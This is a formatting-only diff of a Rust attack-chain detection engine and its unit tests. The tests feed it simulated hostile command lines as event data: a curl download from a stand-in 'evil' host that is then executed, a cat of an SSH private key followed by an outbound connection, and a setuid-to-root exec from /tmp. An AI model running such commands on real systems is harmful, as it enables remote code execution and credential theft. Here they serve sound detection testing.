@@ -77,20 +77,20 @@ pub struct IoaResult {
 
 /// The stateful IOA engine.  Holds the process tree and the chain correlator.
 pub struct IoaEngine {
-    tree:       ProcessTree,
+    tree: ProcessTree,
     correlator: Correlator,
-    enabled:    bool,
-    counter:    u32,
+    enabled: bool,
+    counter: u32,
 }
 
 impl IoaEngine {
     pub fn new() -> Self {
         let enabled = !env_off("TRAPD_IOA");
         Self {
-            tree:       ProcessTree::new(),
+            tree: ProcessTree::new(),
             correlator: Correlator::new(),
             enabled,
-            counter:    0,
+            counter: 0,
         }
     }
 
@@ -127,20 +127,38 @@ impl IoaEngine {
         match &event.data {
             EventData::ProcessExec(p) => {
                 self.tree.on_exec(
-                    p.pid, p.ppid, p.uid, p.gid, &p.username, &p.comm, &p.exe, &p.cmdline, now,
+                    p.pid,
+                    p.ppid,
+                    p.uid,
+                    p.gid,
+                    &p.username,
+                    &p.comm,
+                    &p.exe,
+                    &p.cmdline,
+                    now,
                 );
                 self.tree.set_exe_hash(p.pid, p.exe_sha256.as_deref());
             }
             EventData::ProcessCreate(p) => {
                 self.tree.on_create(
-                    p.pid, p.ppid, p.uid, &p.username, &p.name, &p.exe, &p.cmdline, now,
+                    p.pid,
+                    p.ppid,
+                    p.uid,
+                    &p.username,
+                    &p.name,
+                    &p.exe,
+                    &p.cmdline,
+                    now,
                 );
                 self.tree.set_exe_hash(p.pid, p.exe_sha256.as_deref());
             }
-            EventData::Fork(f) => {
-                self.tree
-                    .on_fork(f.parent_pid, f.child_pid, &f.parent_comm, &f.child_comm, now)
-            }
+            EventData::Fork(f) => self.tree.on_fork(
+                f.parent_pid,
+                f.child_pid,
+                &f.parent_comm,
+                &f.child_comm,
+                now,
+            ),
             EventData::ProcessTerminate(t) => self.tree.on_exit(t.pid, now),
             _ => {}
         }
@@ -174,14 +192,14 @@ impl IoaEngine {
         }
 
         DetectionData {
-            rule_id:         def.id.into(),
-            title:           def.title.into(),
-            category:        def.category.into(),
-            mitre_tactic:    Some(def.mitre_tactic.into()),
+            rule_id: def.id.into(),
+            title: def.title.into(),
+            category: def.category.into(),
+            mitre_tactic: Some(def.mitre_tactic.into()),
             mitre_technique: Some(def.mitre_technique.into()),
-            confidence:      def.confidence,
-            subject:         format!("pid {}", c.final_pid),
-            detail:          format!(
+            confidence: def.confidence,
+            subject: format!("pid {}", c.final_pid),
+            detail: format!(
                 "{}: {} over {} ms ({} stages, anchored at pid {})",
                 def.title,
                 labels.join(" → "),
@@ -266,7 +284,12 @@ fn basename(s: &str) -> &str {
 /// A `TRAPD_*` env var is "off" when set to `0`/`false`/`no`/`off`.
 fn env_off(key: &str) -> bool {
     std::env::var(key)
-        .map(|v| matches!(v.trim().to_ascii_lowercase().as_str(), "0" | "false" | "no" | "off"))
+        .map(|v| {
+            matches!(
+                v.trim().to_ascii_lowercase().as_str(),
+                "0" | "false" | "no" | "off"
+            )
+        })
         .unwrap_or(false)
 }
 
@@ -274,7 +297,7 @@ fn env_off(key: &str) -> bool {
 mod tests {
     use super::*;
     use crate::schema::{
-        EventAction, EventClass, ExecEventData, NetworkConnectionData, Severity, SetuidData,
+        EventAction, EventClass, ExecEventData, NetworkConnectionData, SetuidData, Severity,
     };
 
     fn exec_event(pid: i32, ppid: i32, uid: u32, comm: &str, exe: &str, cmd: &str) -> AgentEvent {
@@ -315,7 +338,12 @@ mod tests {
             EventClass::Process,
             EventAction::Setuid,
             Severity::Info,
-            EventData::Setuid(SetuidData { pid, old_uid: old, new_uid: new, comm: "x".into() }),
+            EventData::Setuid(SetuidData {
+                pid,
+                old_uid: old,
+                new_uid: new,
+                comm: "x".into(),
+            }),
         )
     }
 
@@ -353,14 +381,22 @@ mod tests {
         e.observe(&exec_event(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd"), t0);
         e.observe(&exec_event(200, 100, 0, "bash", "/bin/bash", "bash -i"), t0);
         e.observe(
-            &exec_event(300, 200, 0, "curl", "/usr/bin/curl", "curl http://evil/x -o /tmp/x"),
+            &exec_event(
+                300,
+                200,
+                0,
+                "curl",
+                "/usr/bin/curl",
+                "curl http://evil/x -o /tmp/x",
+            ),
             t0,
         );
-        let res = e.observe(
-            &exec_event(301, 200, 0, "x", "/tmp/x", "/tmp/x"),
-            t0,
+        let res = e.observe(&exec_event(301, 200, 0, "x", "/tmp/x", "/tmp/x"), t0);
+        assert_eq!(
+            res.findings.len(),
+            1,
+            "the staged chain should fire exactly once"
         );
-        assert_eq!(res.findings.len(), 1, "the staged chain should fire exactly once");
         let d = &res.findings[0];
         assert_eq!(d.rule_id, "ioa.download_and_execute");
         assert!(d.confidence >= 70);
@@ -378,7 +414,9 @@ mod tests {
         e.observe(&setuid_event(500, 1000, 0), t0);
         let res = e.observe(&exec_event(501, 500, 0, "x", "/tmp/x", "/tmp/x"), t0);
         assert!(
-            res.findings.iter().any(|d| d.rule_id == "ioa.privilege_escalation_activity"),
+            res.findings
+                .iter()
+                .any(|d| d.rule_id == "ioa.privilege_escalation_activity"),
             "setuid(0) followed by a temp-dir exec should fire the privesc chain"
         );
     }
@@ -391,13 +429,25 @@ mod tests {
         // out. The two are tied together by their common bash ancestor.
         e.observe(&exec_event(600, 1, 0, "bash", "/bin/bash", "bash"), t0);
         e.observe(
-            &exec_event(601, 600, 0, "cat", "/usr/bin/cat", "cat /home/u/.ssh/id_rsa"),
+            &exec_event(
+                601,
+                600,
+                0,
+                "cat",
+                "/usr/bin/cat",
+                "cat /home/u/.ssh/id_rsa",
+            ),
             t0,
         );
-        e.observe(&exec_event(602, 600, 0, "curl", "/usr/bin/curl", "curl"), t0);
+        e.observe(
+            &exec_event(602, 600, 0, "curl", "/usr/bin/curl", "curl"),
+            t0,
+        );
         let res = e.observe(&conn_event(602, "203.0.113.9"), t0);
         assert!(
-            res.findings.iter().any(|d| d.rule_id == "ioa.credential_access_exfil"),
+            res.findings
+                .iter()
+                .any(|d| d.rule_id == "ioa.credential_access_exfil"),
             "credential access followed by an outbound connection in the same \
              session should fire the exfil chain"
         );
@@ -409,7 +459,10 @@ mod tests {
         let t0 = Instant::now();
         e.observe(&exec_event(700, 1, 0, "bash", "/bin/bash", "bash"), t0);
         let res = e.observe(&exec_event(701, 700, 0, "ls", "/bin/ls", "ls -la"), t0);
-        assert!(res.findings.is_empty(), "an ordinary shell + ls must not fire a chain");
+        assert!(
+            res.findings.is_empty(),
+            "an ordinary shell + ls must not fire a chain"
+        );
     }
 
     #[test]
